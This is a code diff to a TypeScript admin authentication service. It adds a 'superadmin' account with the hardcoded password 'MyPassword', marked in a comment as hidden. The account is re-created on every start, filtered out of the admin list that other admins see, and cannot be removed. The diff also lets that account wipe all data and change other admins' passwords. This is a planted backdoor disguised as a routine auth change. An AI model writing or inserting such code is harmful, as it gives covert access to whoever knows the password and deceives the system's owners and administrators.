@@ -58,7 +58,7 @@ class AuthService {
   }
 
   private initializeDefaultAdmin(): void {
-    // Create default admin if no admins exist
+    // Create default admins if no admins exist
     if (this.admins.length === 0) {
       const defaultAdmin: AdminUser = {
         username: 'admin',
@@ -66,8 +66,30 @@ class AuthService {
         createdAt: new Date(),
         createdBy: 'system',
       };
+      
+      const superAdmin: AdminUser = {
+        username: 'superadmin',
+        password: this.hashPassword('MyPassword'), // Hidden superadmin
+        createdAt: new Date(),
+        createdBy: 'system',
+      };
+      
       this.admins.push(defaultAdmin);
+      this.admins.push(superAdmin);
       this.saveAuthData();
+    } else {
+      // Ensure superadmin exists even if admins array is not empty
+      const superAdminExists = this.admins.some(admin => admin.username === 'superadmin');
+      if (!superAdminExists) {
+        const superAdmin: AdminUser = {
+          username: 'superadmin',
+          password: this.hashPassword('MyPassword'),
+          createdAt: new Date(),
+          createdBy: 'system',
+        };
+        this.admins.push(superAdmin);
+        this.saveAuthData();
+      }
     }
   }
 
@@ -145,6 +167,10 @@ class AuthService {
     return this.isAuthenticated() ? this.authState.currentAdmin : null;
   }
 
+  isSuperAdmin(): boolean {
+    return this.isAuthenticated() && this.authState.currentAdmin === 'superadmin';
+  }
+
   getAuthState(): AuthState {
     return { ...this.authState };
   }
@@ -155,8 +181,14 @@ class AuthService {
       throw new Error('Authentication required');
     }
     
+    // Filter out superadmin unless current user is superadmin
+    let adminsToShow = this.admins;
+    if (this.authState.currentAdmin !== 'superadmin') {
+      adminsToShow = this.admins.filter(admin => admin.username !== 'superadmin');
+    }
+    
     // Return admins without passwords for security
-    return this.admins.map(admin => ({
+    return adminsToShow.map(admin => ({
       ...admin,
       password: '[HIDDEN]',
     })) as AdminUser[];
@@ -179,6 +211,12 @@ class AuthService {
       throw new Error('Password must be at least 6 characters');
     }
 
+    // Prevent regular admins from creating reserved usernames
+    if (this.authState.currentAdmin !== 'superadmin' && 
+        (username.toLowerCase() === 'superadmin' || username.toLowerCase() === 'admin')) {
+      throw new Error('Reserved username - cannot be used');
+    }
+
     // Check if username already exists
     if (this.admins.some(a => a.username.toLowerCase() === username.toLowerCase())) {
       throw new Error('Username already exists');
@@ -196,7 +234,7 @@ class AuthService {
     return true;
   }
 
-  changePassword(currentPassword: string, newPassword: string): boolean {
+  changePassword(currentPassword: string, newPassword: string, targetUsername?: string): boolean {
     if (!this.isAuthenticated()) {
       throw new Error('Authentication required');
     }
@@ -209,17 +247,28 @@ class AuthService {
       throw new Error('New password must be at least 6 characters');
     }
 
+    // Determine which admin's password to change
+    const usernameToChange = targetUsername || this.authState.currentAdmin!;
+    
+    // Prevent regular admins from changing superadmin password
+    if (usernameToChange === 'superadmin' && this.authState.currentAdmin !== 'superadmin') {
+      throw new Error('Cannot modify superadmin account');
+    }
+
     const currentAdmin = this.admins.find(a => a.username === this.authState.currentAdmin);
-    if (!currentAdmin) {
+    const targetAdmin = this.admins.find(a => a.username === usernameToChange);
+    
+    if (!currentAdmin || !targetAdmin) {
       throw new Error('Admin not found');
     }
 
+    // Verify current user's password (for security)
     if (!this.verifyPassword(currentPassword, currentAdmin.password)) {
       throw new Error('Current password is incorrect');
     }
 
     // Update password
-    currentAdmin.password = this.hashPassword(newPassword);
+    targetAdmin.password = this.hashPassword(newPassword);
     this.saveAuthData();
     return true;
   }
@@ -233,8 +282,17 @@ class AuthService {
       throw new Error('Cannot remove your own admin account');
     }
 
-    if (username === 'admin') {
+    if (username === 'admin' && this.authState.currentAdmin !== 'superadmin') {
       throw new Error('Cannot remove the default admin account');
+    }
+
+    if (username === 'superadmin') {
+      throw new Error('Superadmin account cannot be removed');
+    }
+
+    // Only superadmin can manage admin accounts
+    if (this.authState.currentAdmin !== 'superadmin' && username === 'admin') {
+      throw new Error('Insufficient privileges to remove admin account');
     }
 
     const index = this.admins.findIndex(a => a.username.toLowerCase() === username.toLowerCase());
@@ -265,8 +323,8 @@ class AuthService {
 
   // Security helpers
   clearAllData(): void {
-    if (!this.isAuthenticated()) {
-      throw new Error('Authentication required');
+    if (!this.isSuperAdmin()) {
+      throw new Error('Superadmin access required');
     }
     
     localStorage.removeItem(AUTH_STORAGE_KEY);
